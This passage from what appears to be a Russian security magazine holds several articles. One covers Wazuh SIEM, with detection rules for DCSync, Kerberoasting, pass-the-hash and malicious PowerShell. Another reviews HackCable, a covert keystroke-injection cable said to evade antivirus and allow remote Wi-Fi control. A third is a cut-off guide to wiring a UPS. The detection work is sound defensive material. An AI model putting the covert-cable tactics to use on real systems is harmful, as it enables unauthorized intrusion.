ные о них, отправить им сообщения или сохранить текст и файлы из чатов —
довольно просто. На основе этой технологии можно создать приложение,
которое будет, например, собирать информацию о юзерах Telegram, которые
добавились в созданную тобой группу или чат. Применений подобному боту
можно найти множество, и я уверен, ты сможешь использовать его с умом.
АДМИН





Сегодня я расскажу о своем опыте работы
с Wazuh — опенсорсной системой, которая
совмещает в себе функции SIEM и XDR.
Это гибкая платформа, которая легко адап‐
тируется под разные задачи: от защиты         Алексей Архипов                                                                                         Специалист
Active  Directory  и  работы  с  PowerShell         по кибербезопасности                                                                                                   rf.arhipov@yandex.ru
до защиты баз данных и быстрого поиска
уязвимостей. Wazuh поддерживает любые
ОС, интегрируется с Docker и внешними
API.


Представь ситуацию: ты вроде бы все меры защиты уже реализовал, необ‐
ходимые (и дорогостоящие) средства купил и даже внедрил и настроил,
но неуверенность все же осталась...
   Впрочем, даже это слишком радужная картина. В большинстве компаний
информационная безопасность только встает на прямые рельсы, ведущие
в светлое и безопасное будущее. Многие процессы не определены или даже
не работают, продукты защиты не до конца настроены или не внедрены и так
далее. Нет полной инвентаризации ИТ‑активов, непонятны сегменты сети, их
защищенность и маршрутизация в них.
   Именно в таком состоянии и были дела в компании, где я недавно раз‐
ворачивал систему безопасности на базе Wazuh. Я работал с этой плат‐
формой и раньше и знал ее потенциал, так что сомнений в выборе не было.
  С помощью Wazuh мы первым делом провели инвентаризацию, чтобы
понять ландшафт: из чего состоит наша инфраструктура, где есть или могут
быть слабые места. Далее настроили сбор событий безопасности и запус‐
тили систему управления уязвимостями (Vulnerability Management). Это поз‐
волило  нам  получить  четкое  представление  о  текущем  состоянии
инфраструктуры и создать основу для дальнейшего укрепления.
  В статье я разберу основные моменты того, как работает Wazuh, какие
преимущества он дает и как может стать основой для устойчивой безопас‐
ности компании любого размера. А также расскажу о практических примерах
его использования.


ЧТО ТАКОЕ WAZUH?

Wazuh — это современная многофункциональная платформа с открытым
исходным кодом. В ней  объединены функции  обнаружения  вторжений,
защиты информационных систем от широкого спектра угроз и реагирования
на инциденты. Wazuh отслеживает и данные и анализирует корреляции в них
на основе правил. Это позволяет выявлять аномальные действия и получать
своевременную информацию об угрозах.
   Модульная структура в сочетании с открытым исходным кодом платформы
обеспечивает масштабируемость и гибкость, что облегчает ее адаптацию
под потребности организаций разного масштаба. Wazuh собирает, нор‐
мализует и коррелирует данные, поступающие из разных источников: от аген‐
тов, устанавливаемых в ОС, из логов syslog и так далее. К тому же Wazuh мож‐
но интегрировать с другими системами безопасности и аналитическими
платформами.
   Вот основные типы событий, которыми оперирует Wazuh:
 • ошибки приложений и систем;
 • сообщения о некорректных настройках;
 • информация о вредоносных действиях или попытках совершить их;
 • сообщения о нарушении политик и других мер безопасности;
 • изменение атрибутов файлов или нарушение целостности;
 • результаты сканирования ПО;
 • сведения об операционной системе, запущенных процессах, установ‐
   ленных приложениях, инвентаризационная информация (серийный номер,
   тип процессора, количество RAM и тому подобные).


ВЕРХНЕУРОВНЕВАЯ АРХИТЕКТУРА WAZUH





                     Верхнеуровневая архитектура Wazuh

Давай посмотрим, какие есть виды взаимодействия компонентов.
 1. Агенты и менеджер:
    • Агенты устанавливаются на разных устройствах и постоянно мониторят
      систему на предмет изменений, потенциальных угроз или аномалий.
    • Собранные данные отправляются менеджеру.
 2. Менеджер и сервис индексации:
    • Менеджер анализирует полученные от агентов данные и формирует
      оповещения при обнаружении угроз.
    • Обработанные данные и оповещения отправляются в сервис индекса‐
     ции через API на порт 9200 (TCP) для хранения и дальнейшего анализа.
 3. Менеджер и база данных:
    • Менеджер взаимодействует с базой данных для хранения настроек,
     политик безопасности и другой необходимой информации.
 4. Панель управления и менеджер/сервис индексации:
    • Панель управления обращается к менеджеру через API на порте 55000
      (TCP) для получения информации.
 5. Пользователи и панель управления:
    • Пользователи получают доступ к системе через веб‑интерфейс панели
      управления.


СЦЕНАРИИ ИСПОЛЬЗОВАНИЯ

Теперь давай посмотрим, как Wazuh можно интегрировать в ландшафт орга‐
низации.





                         Схема работы компании

На схеме выше показаны рабочие процессы организации. Устройства сот‐
рудников и виртуальные машины сервисов оборудованы агентами Wazuh,
которые позволяют отслеживать события, связанные с безопасностью, вклю‐
чая сбор логов и мониторинг активности. Эти данные централизованно
отправляются в основную аналитическую систему Wazuh для детального ана‐
лиза.
   События, получаемые от файрвола для веб‑приложений (WAF), также нап‐
равляются на сервер Wazuh. Этот процесс помогает постоянно мониторить
атаки на веб‑приложения.
   Логи, поступающие из систем управления идентификацией и доступом
(Identity and Access Management, IAM), тоже интегрированы с Wazuh. Их ана‐
лиз позволяет системе выявлять нетипичные действия пользователей, а так‐
же фиксировать успешные и неудачные попытки авторизации. Это критически
важно, чтобы своевременно замечать потенциальные случаи компрометации
учеток.
   Данные событий от VPN-соединений, передаваемые в Wazuh, включают
информацию об успешных и неудачных попытках подключения через VPN —
полезно, чтобы выявлять атаки вроде подбора пароля, плюс можно выявлять
попытки входа из необычных стран.
   Итого у нас есть интеграция с WAF IAM и VPN, что, согласись, довольно
неплохо.
   Wazuh  позволяет  создавать  пользовательские  декодеры  и  правила
для детектирования разных событий безопасности. Декодеры выполняют
нормализацию событий, упрощая их анализ, тогда как правила позволяют
оперативно оповещать о критических инцидентах.
   Дальше разберем основные примеры использования этих возможностей
на практике.


ЗАЩИТА ACTIVE DIRECTORY





          Пример событий с базовыми атаками на Active Directory

С помощью настроенных правил пользователи Wazuh могут анализировать
события Directory Replication Service (DRS) из журналов событий Windows.
Это полезно, когда нужно фиксировать аномалии в запросах репликации,
характерные для атак DCSync. Задаешь подходящие правила для определен‐
ных EventId и их свойств, и система обеспечит своевременное оповещение
о подозрительных действиях.
   Правила могут извлекать и анализировать запросы к службе Kerberos
Ticket-Granting Service (TGS) из журналов событий. Правило, отслеживающее
частые запросы TGS, особенно если они связаны с учетными записями
служб, помогает обнаружить попытки атак типа Kerberoasting.
   Кроме того, собирая события аутентификации NTLM, Wazuh помогает
обнаруживать атаки pass the hash. Правила, настроенные для поиска харак‐
терных  шаблонов  действий,  генерируют  предупреждения,  когда  кто‑то
использует учетные данные подозрительным образом.
   Дальше — пример, как это может быть настроено с помощью правил
для Wazuh.


<group name="security_event, windows,">


   <rule id="110001" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-
9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</
field>
    <options>no_full_log</options>
    <description>Directory Service Access. Possible DCSync attack</
description>
  </rule>


 <rule id="110009" level="0">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-
9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</
field>
    <field name="win.eventdata.SubjectUserName" type="pcre2"> \$$</
field>
    <options>no_full_log</options>
    <description>Ignore all Directory Service Access that is
originated from a machine account containing $</description>
  </rule>


   <rule id="110002" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.TicketOptions" type="pcre2">0x40810000
</field>
    <field name="win.eventdata.TicketEncryptionType" type="pcre2">
0x17</field>
    <options>no_full_log</options>
    <description>Possible Kerberoasting attack</description>
  </rule>


  <rule id="110003" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.LogonProcessName" type="pcre2">seclogo
</field>
    <field name="win.eventdata.LogonType" type="pcre2"> 9</field>
    <field name="win.eventdata.AuthenticationPackageName" type=
"pcre2">Negotiate</field>
    <field name="win.eventdata.LogonGuid" type="pcre2">{00000000-
0000-0000-0000-000000000000}</field>
    <options>no_full_log</options>
    <description>Possible Pass the hash attack</description>
  </rule>


</group>

С помощью этих простых действий мы получаем уведомления о базовых ата‐
ках на Active Directory. Архитектуру при этом легко масштабировать.


«БЯКА» POWERSHELL





          Пример событий с использованием команд PowerShell

В Wazuh предусмотрена возможность интеграции разных журналов и файлов
с логами, что позволяет, например, подключать события из журнала Windows
PowerShell.
   После подключения нужного журнала можно создать соответствующие
декодеры  и  правила,  чтобы  фиксировать  ключевые  события.  Однако
без фильтрации поступающих данных есть риск получить слишком много
событий, включая нерелевантные, так как будут обрабатываться все записи
журнала. Для решения этой проблемы на следующем этапе создается сло‐
варь команд, за которыми необходимо следить, и подключаются списки
команд, представляющих потенциальный риск.
   Как это можно реализовать? Добавляем в основной файл  настроек
ossec.conf путь до словарика с «опасными» командами.


<list>etc/lists/malicious-powershell</list>

Далее пишем правила.


<var name="MS_FREQ"> 8</var>
<group name="windows,">
  <rule id="100543" level="12">
    <if_sid>100541</if_sid>
    <list field="win.eventdata.scriptBlockText" lookup="match_key">
etc/lists/malicious-powershell</list>
    <description>Malicious Powershell Command $(win.eventdata.
scriptBlockText) Executed</description>
    <options>no_full_log</options>
  </rule>
</group>

Настраивая Wazuh на отслеживание только потенциально опасных команд,
можно сократить число ложных уведомлений, что облегчает контроль и улуч‐
шает его результаты.


WAZUH И БАЗЫ ДАННЫХ





                Пример событий, связанных с PostgreSQL

Расширяемая архитектура мониторинга журналов в Wazuh поддерживает
удобную интеграцию с логами PostgreSQL (postgresql-*-main.log). Под‐
ключаем журналы PostgreSQL, и система сможет в режиме реального вре‐
мени фиксировать критически важные события в базе данных, такие как соз‐
дание и удаление баз данных, изменение структуры таблиц и манипуляции
с данными.
   Wazuh применяет декодеры и правила для мониторинга логов PostgreSQL,
чтобы отслеживать и фиксировать подозрительные или несанкционирован‐
ные действия с базой данных.
   Например:


<group name="postgresql,">
  <rule id="100080" level="0">
    <decoded_as>postgresql</decoded_as>
    <description>No alerts.</description>
  </rule>
  <rule id="100081" level="4">
    <if_sid>100080</if_sid>
    <match type="pcre2">(?i)create database</match>
    <description>A database $(database) has been created by the user
$(db_user).</description>
  </rule>
  <rule id="100082" level="6">
    <if_sid>100080</if_sid>
    <match type="pcre2">(?i)drop database</match>
    <description>A database $(database) has been deleted by the user
$(db_user).</description>
  </rule>


...
</group>

С такой настройкой Wazuh будет предупреждать и о несанкционированных
манипуляциях с базами данных.





БЫСТРОЕ ОБНАРУЖЕНИЕ ТРЕНДОВЫХ УЯЗВИМОСТЕЙ





                      Список пакетов с агента Wazuh

Используя Wazuh API, можно оперативно извлекать данные о версиях пакетов
и  настройки с  каждого  подключенного  агента. Этот  подход  особенно
полезен, когда вендор еще не исправил уязвимость в ОС. Wazuh позволяет
заранее определить уязвимые хосты на основе версии пакета, содержащего
известную уязвимость. Это можно использовать, пока не выйдет патч.


OPEN SOURCE И ОТЕЧЕСТВЕННЫЕ ОС

Wazuh совместим с РЕД ОС, Astra Linux и прочими дистрибутивами, с которы‐
ми сейчас можно столкнуться у заказчиков. Для работы с ними можно просто
отредактировать /etc/os-release, но из‑за несовпадений пакетной базы
с описанием это может вызвать ложные срабатывания.
   Правильный путь — пересобрать пакеты из исходного кода и добавить
РЕД ОС или Astra Linux в качестве новых провайдеров в среду Wazuh.
Это позволит Wazuh точно сканировать и анализировать отечественные дис‐
трибутивы.


WAZUH И DOCKER





                  Пример событий, связанных с Docker

Модуль Wazuh для Docker (Docker-listener) позволяет отслеживать события,
связанные с основными командами и действиями Docker, которые влияют
на управление контейнерами. В частности, модуль фиксирует такие команды,
как docker push, docker pull, docker kill, а также другие важные опе‐
рации. Эти правила доступны «из коробки», останется только настроить
модуль Docker-listener.


ИНТЕГРАЦИЯ С ВНЕШНИМИ API

Wazuh Integrator позволяет подключаться к внешним API и прочим инструмен‐
там. По умолчанию он настроен на несколько известных платформ, но у
Wazuh Integrator гибкие настройки, так что можно настроить свои интеграции.
   Например,  интеграция  с  системой  SOAR   (Security  Orchestration,
Automation and Response) позволит объединить решения в единую систему
и автоматизировать реагирование на инциденты. Или для анализа угроз
можешь подключить Wazuh к VirusTotal. И это только небольшая часть воз‐
можностей этого модуля.


WAZUH И SCA BENCHMARK

Security Configuration Assessment (SCA) — это аудит настроек безопасности
всех систем организации и их проверка на соответствие установленным пра‐
вилам. Одна из главных стратегий защиты конечных точек — их укрепление
(харденинг) за счет минимизации уязвимостей.
  SCA помогает не только выявить и оценить слабые места, но и предложить
корректирующие меры для их устранения, тем самым существенно снижая
площадь атаки и повышая общую устойчивость системы.
   Модуль SCA в Wazuh регулярно сканирует контролируемые конечные точ‐
ки, выявляя уязвимости и отклонения. Этот процесс опирается на политики,
содержащие набор правил для проверки актуальных настроек системы.
   Файлы политик задают условия соответствия требованиям безопасности.
Например, SCA проверяет наличие файлов и каталогов, ключи и значения
реестра, запущенные процессы, а также рекурсивно анализирует содер‐
жимое каталогов для выявления отклонений.
   Wazuh использует CIS Benchmarks для автоматической оценки конфигура‐
ции систем на соответствие требованиям безопасности. В ходе сканиро‐
вания он выявляет отклонения от стандартов CIS.


CIS
Центр интернет‑безопасности (Center for Internet Security, CIS) — неком‐
мерческая организация, которая занимается повышением уровня кибер‐
безопасности. CIS разрабатывает стандарты и рекомендации, такие как CIS
Benchmarks и CIS  Controls, которые широко  используются для защиты
информационных систем и данных.
  CIS Benchmarks — это инструкции по безопасной настройке операци‐
онных систем, серверных приложений, облачных сервисов и программного
обеспечения. Их разрабатывают и обновляют эксперты по безопасности,
учитывая актуальные угрозы и технологии.
  CIS Controls — это набор приоритетных мер для предотвращения наибо‐
лее  опасных  кибератак. Они  помогают  организациям  сосредоточиться
на критически важных аспектах безопасности.



ВЫВОДЫ

Думаю, мне удалось показать, что Wazuh — это не просто еще один инстру‐
мент, а целая платформа, которую легко адаптировать под разные задачи.
Это универсальный инструмент в арсенале безопасности: от защиты Active
Directory и работы с PowerShell до защиты баз данных и быстрого поиска уяз‐
вимостей. Wazuh поддерживает любые ОС, интегрируется с Docker и внеш‐
ними API.
   Итого профиты для работников компаний: освоив Wazuh, специалисты
получают ощутимый плюс в копилку знаний, что делает их более конкурен‐
тоспособными на рынке ИТ и ИБ. Профиты для владельцев компаний: спе‐
циалист по Wazuh в штате существенно сэкономит затраты на продукты ИБ
Enterprise, особенно когда про ИБ только задумались.
GEEK





HackCable — устройство с Kickstarter, которое снаружи выг‐
лядит как обычный провод, а внутри скрывает целый арсенал
для  этичного  хакинга:  инъекции нажатий  клавиш,  Wi-Fi-
управление через смартфон и полный контроль над целевым
устройством. Все это в формате привычного зарядного
кабеля,  который  не  привлечет  внимания даже  самого
параноидального админа.


Переходник с USB-A на USB-C — самая обычная вещь в наше время. Но что,
если этот кабель умеет не только заряжать смартфон или передавать данные,
но и перехватывать нажатия клавиш, а еще сам иногда становится клавиату‐
рой и что‑то печатает? Встречай HackCable — проект, который уже набрал
на Kickstarter необходимую для производства сумму и готовится к выпуску.
Сбор средств официально закроется в субботу, 16 февраля.
   Кабель выйдет в двух версиях: с модулем Wi-Fi на базе ESP32 для удален‐
ного перехвата и в варианте с чипом RP2040 для локальных задач. Обе
модификации поддерживают Python и работают с устройствами на Windows,
macOS, Linux, Android и iOS.
  Обе версии используют один принцип — представление себя как HID-
устройство. Это позволяет вводить команды напрямую, обходя антивирусы
и системы обнаружения.





  Предполагается, что HackCable будет неотличим от обычного переход‐
  ника с USB-A на USB-C


ОБЫЧНАЯ ВЕРСИЯ (RP2040)

 • Процессор:  двухъядерный ARM  Cortex-M0+  с  тактовой  частотой
   до 133 МГц
 • Память: 2 Мбайт встроенной QSPI Flash и 264 Кбайт SRAM
 • Порты ввода‑вывода: полноскоростная поддержка USB 1.1 в режиме
   хоста и устройства, 26 многофункциональных GPIO-пинов
 • Цифровые интерфейсы: один интерфейс I2C, два интерфейса SPI, два
   интерфейса UART и поддержка PWM на большинстве GPIO-пинов

HackCable на базе RP2040 работает автономно и не зависит от внешних под‐
ключений. Сначала пользователь загружает на кабель подготовленные скрип‐
ты через компьютер. Скрипты могут быть на Python или на другом под‐
ходящем  языке.  Эти  скрипты  описывают  последовательность  команд,
которые кабель будет вводить при подключении к целевому устройству.
   Когда кабель вставляют в порт USB-C, устройство распознаёт его как кла‐
виатуру и позволяет скриптам «нажимать» кнопки напрямую, не вызывая
подозрений у системы или антивирусов. HackCable последовательно выпол‐
няет заданные действия: например, открывает терминал, вводит команды
для проверки сетевых настроек или демонстрирует потенциальные уязвимос‐
ти системы.
   Благодаря встроенному чипу RP2040 кабель действует как автономный
пентест‑агент: он не требует Wi-Fi, не зависит от сторонних приложений
и всегда выполняет ровно тот сценарий, который был загружен заранее.
Такой подход делает устройство надежным и предсказуемым — оно просто
выполняет свою программу сразу после подключения, без необходимости
какого‑либо вмешательства.


ВЕРСИЯ С WI-FI НА ESP32

 • Процессор: двухъядерный микроконтроллер Xtensa LX7
 • Тактовая частота: до 240 МГц
 • Wi-Fi: встроенный модуль Wi-Fi 2,4 ГГц (802.11b/g/n)
 • Bluetooth: встроенный Bluetooth 5 (LE) с поддержкой энергоэффективной
   и надежной передачи данных

Здесь все аналогично версии на RP2040 с той разницей, что есть поддержка
Wi-Fi. Модуль ESP32 создает свою точку доступа, можно подключиться к ней
с любого устройства — смартфона, планшета или ноутбука — и управлять
удаленно через веб‑интерфейс. В интерфейсе достаточно ввести команды
или загрузить скрипт, после чего HackCable начнет передавать команды
в целевую систему.
   Это дает возможность работать на расстоянии. Единожды вставив кабель
в устройство, можно подключаться к нему по Wi-Fi в любое время, пока
устройство остается включенным. При необходимости можно задействовать
несколько таких кабелей, синхронизировав их для одновременной работы
через режим мастер — слейв.
   То есть если в рамках редтиминга или физического пентеста нам удалось
проникнуть на объект, то достаточно воткнуть пару таких проводов тут и там,
и всё — считай, закрепились на периметре. Можем сидеть напротив окон
офиса на лавочке, попивать из термоса кофеек и шариться по внутренней
сети.


Альтернативы
HackCable — не первый проект такого рода. На рынке уже есть несколько
проектов и устройств, которые выполняют схожие задачи. Вот некоторые
из них.
 1. USB Rubber Ducky (Hak5). Это, пожалуй, самый известный инструмент
   в  области  тестирования  безопасности.  Rubber  Ducky  маскируется
   под обычную USB-клавиатуру, но может запускать запрограммированные
   сценарии атак, например для тестирования уязвимостей в системах.
 2. O.MG Cable (Hak5). Кабель, внешне неотличимый от стандартного USB,
   но способный перехватывать данные, запускать полезные нагрузки и даже
   управляться удаленно через Wi-Fi. O.MG Cable стал своего рода эталоном
   в области аппаратного пентестинга.
 3. ESPKey . Это устройство использует чип ESP8266 для перехвата сигналов
   от  систем  контроля  доступа. Оно  популярно  среди  исследователей
   безопасности, работающих с RFID-системами.
 4. WHID Injector (Wi-Fi HID Injector). Гаджет, способный эмулировать
   клавиатуру и мышь через Wi-Fi. Применяется в аудите безопасности, что‐
  бы проверить устойчивость системы к  атакам,  когда злоумышленник
   не имеет физического доступа.
 5. P4wnP1 — альтернативный проект на базе Raspberry Pi Zero, умеющий
   многие вещи, включая эмуляцию HID-устройств, MITM-атаки и многое дру‐
   гое.

Также атаки BadUSB можно проводить напрямую со смартфона. Как имен‐
но — читай в статьях «Киберфон. Превращаем телефон на Android в инстру‐
мент хакера» и «Продвинутый киберфон. Заряжаем телефон  хакерской
силой».



ЦЕНЫ

Версию HackCable с Wi-Fi на Kickstarter можно предзаказать за 59 долларов.
Два Wi-Fi-кабеля обойдутся в 115 долларов, а комплект из четырех —
в 225 долларов.
   Версия на RP2040 стоит 49 долларов по спецпредложению. Два таких
кабеля стоят 95 долларов, а четыре — 185 долларов.
   Также есть комбинированный набор, который включает один Wi-Fi-кабель
и один RP2040, за 90 долларов.


           WARNING

                          Помни, что Kickstarter — не интернет‑магазин.
                    Даже если  проект  набрал  нужное  количество
                       денег и ты успел заказать устройство, это не зна‐
                           чит, что оно придет вовремя или вообще придет.
                     Ты  всего лишь  участвуешь  в  краудфандинге,
                      и возможны как задержки, так и полный провал
                            проекта, после чего деньги могут и не вернуть.



ДОСТУПНОСТЬ

HackCable планируют запустить в шесть этапов с января по май 2025 года.
Первый этап — сбор средств, он завершится в середине февраля. После
этого, с февраля по март 2025 года, команда займется закупкой комплек‐
тующих для производства.
   Массовое производство запланировано на период с марта до начала
апреля 2025 года. В апреле будет проходить тестирование и  упаковка
готовой продукции. Наконец, доставка устройств начнется в мае 2025 года,
и на этом проект достигнет своей цели. Скорее всего, HackCable можно
будет купить и потом — без рисков, но по большей цене.
   Разработчики обещают открыть исходники, однако что именно будет
открыто (схемы, прошивка или только софт), пока что не уточняется.
GEEK





Чтобы обеспечить бесперебойное электро‐
питание  своего  дома,  офиса или  сер‐
верной, купить мощный UPS еще недос‐
таточно — нужно его грамотно подключить.
Сегодня мы выясним, какие способы под‐         Евгений Андреев                                                                                    ea9574524@gmail.com
ключения   существуют,  какие   комплек‐
тующие лучше использовать и как делать
нельзя.


В этой статье речь пойдет о правильном подключении резервного источника
к серверной или к любому другому помещению (квартире, офису, дому).
Далее мы:
 • составим список всего необходимого и разберемся, какой нужен кабель,
   как подобрать автоматический выключатель, чтобы ничего не сжечь;
 • рассмотрим три разных способа подключения резервного источника —
   непосредственное подключение инвертора (в режиме by-pass), исполь‐
   зование трехпозиционного переключателя, подключение с помощью АВР;
 • разберем типичные ошибки.

Сразу небольшая ремарочка: мы будем рассматривать только однофазную
сеть. В большинстве случаев у тебя будет именно такая, поэтому не станем
усложнять эту статью тремя фазами. После ее прочтения ты сможешь самос‐
тоятельно подключить инвертор (UPS) и сэкономишь от десяти тысяч рублей
(в зависимости от региона) за услуги электрика.


             INFO

                           Читай  также мою  предыдущую  статью:  «ИБП
                        по‑домашнему. Собираем бюджетный литиевый
                   UPS для своей серверной».



ИСХОДНАЯ ТОЧКА

Для понимания процесса зафиксируем исходную точку. У тебя есть инвертор,
возможно уже подключенный к аккумулятору. По крайней мере готовы про‐
вода для подключения к батарее и собран сам аккумулятор (если ты решил
делать его сам). Здесь я подчеркиваю фразу «подключенный к аккумулятору»:
многие инверторы нельзя включить без предварительного подключения —
они просто не запустятся или ты получишь ошибку (если подключишь устрой‐
ство к сети 220 В). Вместо инвертора у тебя может быть зарядная станция
вроде EcoFlow — этот вариант тоже сгодится, будем считать ее маломощным
инвертором  (довольно дорогие модели EcoFlow имеют мощность  око‐
ло 2 кВт, а для гибридных инверторов, можно считать, это только самое
начало).
   Осталось твой резервный источник подключить к твоей же проводке,
да так, чтобы ничего не сгорело — ни сам резервный источник, ни другие
приборы.


ПОДГОТОВИТЕЛЬНЫЕ МЕРОПРИЯТИЯ

Прежде чем  приступить, нам надо  купить  дополнительные  устройства
и кабель нужного сечения (об этом — в следующем разделе), а также найти
входной автомат. Обычно он находится рядом со счетчиком. Иногда на лес‐
тничной клетке (если речь идет о квартире), иногда в щитке при входе
в помещение. Необходимые дополнительные устройства зависят от способа
подключения. Ничего не покупай, пока не прочитаешь эту статью. Во‑первых,
ты сразу определишься, что тебе нужно, во‑вторых, может, кроме кабеля
и клемм Wago, в твоем случае больше ничего и не понадобится.
   Максимальный buy-лист выглядит так.
 1. Кабель 5-жильный нужного сечения и нужной длины.
 2. Клеммы Wago.
 3. Крепеж для кабеля.
 4. Изолента.
 5. Инструмент: кусачки, инструмент для снятия изоляции (если не хочешь
   делать это подручными средствами, хотя тоже можно), набор отверток,
   тестер (чтобы определять, где фаза, а где ноль).
 6. Средство ввода резерва — это может быть как АВР, так и трехпозици‐
   онный переключатель.
 7. Двухполюсные (2P) автоматические выключатели — две штуки (номиналь‐
  ный ток уточним дальше).
 8. Щиток для 2P-автоматов и средства переключения, если в основном щит‐
   ке нет мест.

Начнем с выбора типа и сечения кабеля.


ВЫБОР ТИПА И СЕЧЕНИЯ КАБЕЛЯ

Мне не хочется переписывать многочисленные статьи в сети, которые ты
можешь найти по запросу «типы электрического кабеля». Если вкратце, то
при выборе кабеля понять его тип и выяснить, подходит он тебе или нет, мож‐
но по маркировке:
 • ВВГ — силовой кабель с медными жилами, ПВХ‑изоляцией и оболочкой.
   Подходит для стационарной прокладки. Может быть плоским (ВВГ‑П)
   или гибким (ВВГнг-LS — не поддерживает горение, с низким дымовы‐
   делением);
 • ПВС —  провод с медными  многопроволочными жилами и двойной
   ПВХ‑изоляцией. Гибкий, используется для подключения бытовых при‐
   боров, удлинителей и временной электропроводки;
 • КГ — кабель гибкий, с резиновой изоляцией и оболочкой. Применяется
   для подключения подвижного оборудования, выдерживает механические
   нагрузки;
 • АВВГ — аналог ВВГ, но с алюминиевыми жилами. Легче и дешевле,
   но менее гибкий и долговечный;
 • NYM — немецкий силовой кабель с медными жилами, двойной ПВХ‑изо‐
   ляцией и дополнительным слоем из невулканизированной резины. Под‐
   ходит для скрытой и открытой проводки;
 • ШВВП — плоский провод с гибкими жилами и ПВХ‑изоляцией, исполь‐
   зуется для подключения маломощных бытовых приборов;
 • ВБбШв — силовой кабель с броней из стальных лент, защищен от механи‐
   ческих повреждений, подходит для прокладки в земле.

Методом исключения отбросим неподходящие варианты:
 • ВБбШв — очень дорого (ты же не бункер собрался обеспечивать резер‐
  вным питанием?);
 • ШВВП — тоже не годится, поскольку он не выдержит нужной тебе наг‐
   рузки. Обычно такой кабель используют для подключения отдельных
   не очень мощных электрических приборов;
 • АВВГ — алюминиевый кабель нам не подходит. В большинстве случаев
   у тебя будет медная проводка, поэтому нет смысла использовать алю‐
   миниевый кабель. Тем более при использовании алюминия сечение
   кабеля должно быть больше.

Остаются варианты ВВГ, ПВС, КГ и NYM. Кабель NYM обычно дороже, чем
ВВГ. Это связано с тем, что у NYM есть дополнительный слой изоляции
из ПВХ или резины, который повышает его стойкость к внешним воздействи‐
ям. Кроме того, NYM чаще производится по европейским стандартам, что
также может влиять на цену. ВВГ, в свою очередь, более распространен
в России и СНГ, что делает его дешевле. То же самое можно сказать и о
кабеле КГ — он довольно дорогой. Этот провод хорошо выдерживает отри‐
цательные  температуры,  не  дубеет  на морозе  и  идеально  подойдет
для садового удлинителя, но для нашей затеи дороговат.
   Остаются два варианта — ВВГ(нг) и ПВС. Первый представляет собой
монолитный кабель, второй — многопроволочный. Жила — это металличес‐
кая проволока, сердцевина всех кабелей и проводов. Ток проходит именно
по жиле. По количеству проволок, входящих в состав, жилы бывают монолит‐
ными (как раз из них и состоит ВВГ‑кабель) или многопроволочными (ПВС).
   Первый более надежный и отлично подходит для скрытого монтажа, нап‐
ример если проводка будет замурована на веки вечные в стене. Также бла‐
годаря особой изоляции он хорошо годится для наружного монтажа даже
без гофры. Так что, если инвертор будет установлен вдали от помещения,
которое тебе нужно резервировать, и кабель будет проходить по улице, твой
выбор — ВВГ(нг). Еще и на гофре сэкономишь — как деньги, так и время
(поскольку протянуть кабель в гофре, особенно если длина кабеля превыша‐
ет десять метров, — та еще задача). А вот ПВС при наружном монтаже при‐
дется помещать в гофру, иначе прослужит он недолго. Поэтому если ты наде‐
ешься купить ПВС и сэкономить — готов тебя огорчить. Также ВВГ(нг) —
это негорючий кабель, что тоже немаловажно.





                               Кабель ВВГ(нг)

Но у кабеля ПВС есть одно преимущество. Благодаря тому что он многоп‐
роволочный, он очень гибкий, что существенно упрощает монтаж, особенно
внутри помещения. Также он белый и красивый, что тоже немаловажно, если
ты будешь прокладывать его внутри помещения без кабель‑канала.
  В общем, мой выбор — ВВГ(нг), так как мой кабель проходит вдоль зда‐
ния, а сам инвертор находится в подсобном помещении. Чтобы перестра‐
ховаться, я поместил его в гофру, но ты можешь этого не делать. А какой
кабель подходит тебе — выбирай сам, но только из этих двух вариантов: ПВС
или ВВГ.
   Теперь о сечении кабеля. Этот параметр определяет, какую нагрузку смо‐
жет пропустить через себя кабель без нагревания и разрушения. Если ты
не хочешь, чтобы случился пожар, нужно не экономить и покупать кабель
необходимого сечения.
   Самое правильное решение — открыть документацию по своему инверто‐
ру и в соответствующем разделе найти информацию о нужном сечении.
На следующей иллюстрации показан пример такой информации.





        Информация о сечении кабеля в документации по инвертору

Что есть что:
 • PV input — это кабель для солнечных панелей. Пропускаем;
 • AC input — входящий кабель, используется для зарядки аккумулятора;
 • battery input — кабель для аккумулятора, ты его уже выбрал в прошлой
   статье;
 • AC output — выходной кабель, от инвертора к помещению.

                                                 2Как видишь, здесь рекомендуют сечение 10 мм  , что для входящего, что
для исходящего кабеля. Кабель с таким сечением может выдержать ток
силой 70 А и напряжение мощностью ~15,4 кВт. Стоит ли использовать такой
кабель, если у тебя входящий автомат на 25 А, следовательно, максимальная
мощность, которая может «прилететь», — 5,7 кВт (25 · 230)? Очевидно, что
нет. Поэтому есть смысл придерживаться номинала входящего автомата
при подборе кабеля.
   Например, если входящий автомат на 25 А, то такой ток может выдержать
                         2кабель сечением 2,5 мм  . Однако лучше перестраховаться и использовать
             2кабель 4 мм  , тем более что не всегда производитель честно указывает
                         2сечение и вместо 2,5 мм  может оказаться 2,3 или даже 2,0. Если же вхо‐
                                                                 2дящий автомат на 32 А, тогда выбираем кабель сечением 6 мм  (к слову,
такой кабель может выдержать ток 46 А и мощность 10,1 кВт), поэтому эко‐
номия у нас здравая. От того, что мы сэкономим, ничего не сгорит, по край‐
ней мере — не должно.
   Если длина кабеля достаточно большая (более 10 м), подскажу, на чем
можно  сэкономить:  используй пятижильный кабель. Вместо того  чтобы
покупать два трехжильных кабеля (для AC input и AC output), используй один
пятижильный (две фазы, два ноля и одна жила для заземления). Так выйдет
заметно дешевле, чем два трехжильных провода.
   Посмотрим на цифры. Представим, что тебе нужно 20 м кабеля сечени‐
        2ем 4 мм  . Средняя цена трехжильного кабеля — 210 р./м (на момент написа‐
ния статьи), а пятижильного — 320. В первом случае тебе понадобится не 20,
а 40 м (так как от входного автомата до инвертора 20 м и 20 м возвращается
обратно) и выйдет 8400 р., а во втором тебе достаточно 20 м по 320 р. —
6400 р. Здесь можно даже взять кабель качеством получше за 350 р., и все
равно получится дешевле.
   Что же касается руководства по инвертору, часто бывают несоответствия.
